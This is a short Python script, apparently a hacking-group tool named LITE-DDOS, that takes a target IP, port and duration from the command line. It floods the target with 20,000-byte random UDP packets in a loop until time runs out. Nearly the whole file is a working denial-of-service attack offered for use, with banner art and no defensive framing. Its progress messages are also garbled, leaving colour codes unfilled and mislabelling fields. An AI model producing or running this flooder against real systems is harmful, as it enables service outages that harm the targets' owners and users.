import time
import socket
import random
import os
import sys

red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
blue="\033[1;34m"
purple="\033[1;35m"
cyan="\033[1;36m"
violate="\033[1;37m"
nc="\033[00m"
BIRed="\033[1;91m"

class logo:
  @classmethod
  def tool_header(self):
    print(f'''\007

{purple}
          ██████╗ ██╗      ██████╗ ██╗   ██╗
          ██╔══██╗██║      ██╔══██╗╚██╗ ██╔╝
          ██████╔╝██║█████╗██████╔╝ ╚████╔╝ 
          ██╔═══╝ ██║╚════╝██╔═══╝   ╚██╔╝  
          ██║     ██║      ██║        ██║   
          ╚═╝     ╚═╝      ╚═╝        ╚═╝   {yellow}v0.0.0.1 Beta          

{cyan} =============================================
{yellow}|            Installed using Pi-Py            |
{yellow}|       Big Black Cap Security (BBCSec)       |
{cyan} ============================================={nc}''')

os.system("clear")

def usage():
    print(f'''\007
    {green}#########################################################
    #------------------------[{BIRed}LITE-DDOS{green}m]---------------------#
    "#-------------------------------------------------------#"
    "#   {BIRed}Command: " "python3 LITEDDOS.py " "<ip> <port> <packet> {green}m   #"
    "#                                                       #"
    "#{BIRed}Creator: Role34  {green}m##      ###       ##                #"
    "#{BIRed}Title  : Founder        {green}m##     #          ##                #"
    "#{BIRed}Version: 1.0.0.0        {green}m##      ###       ##                #"
    "#                   ## {BIRed} ##     {green}m#  {BIRed}##  {green}m##                #"
    "#                   ##  {BIRed}##  {green}m###   {BIRed}##  {green}m######            #"
    "#               {BIRed}<--[BBC Security]-->         {green}m#"
    "#########################################################"
    "                        @@@@@@@@@@"
    "                       @@@@@@@@@@@@"
    "                     @@@@@@@@@@@@@@@@"{nc}''')


def flood(victim, vport, duration):
    # Support us! :)
    
    # Okay, So here I create server, When I call "SOCK_DGRAM" it shows UDP type program
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 20000 one byte representation to the server
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print ("{BIRed}Start {green}%s {BIRed}Sended Packages {green}%s {BIRed}On Ports {green}%s "%(sent, victim, vport))

def main():
    print(len(sys.argv))
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()
